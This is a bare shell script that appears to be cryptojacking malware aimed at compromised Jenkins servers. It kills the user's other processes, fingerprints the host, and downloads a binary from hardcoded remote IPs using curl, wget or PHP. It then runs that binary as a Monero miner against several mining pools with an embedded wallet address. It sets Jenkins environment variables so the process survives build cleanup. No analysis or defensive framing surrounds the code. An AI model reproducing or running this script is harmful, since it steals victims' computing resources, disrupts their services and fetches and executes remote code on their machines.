
for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";
rm -rf debug;
d() {
    curl $1 -o debug 2> /dev/null || wget $1 -O debug 2> /dev/null || php -r 'file_put_contents("debug", fopen("$1", "r"));';
}

d "http://13.124.233.59:8080/job/Insecure-Jenkins/ws/debug" || d "http://59.10.55.218:8081/job/Insecure-Jenkins/ws/debug"

chmod +x debug;

p() {
	BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1 -u 46UTnu18o7jZPmFRzJA72yXAWNLPudFrYRg2cP2wk2jWEAFnHsUXoMhVn28VoRXrnoVm86kk3wosk2qM4jpRQWGyCjFDDdC.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
}

p "pool.minexmr.com:4444" && p "91.121.87.10:4444" && p "pool.minexmr.com:7777" && p "pool.minexmr.com:80" && p "91.121.87.10:7777" && p "91.121.87.10:80"
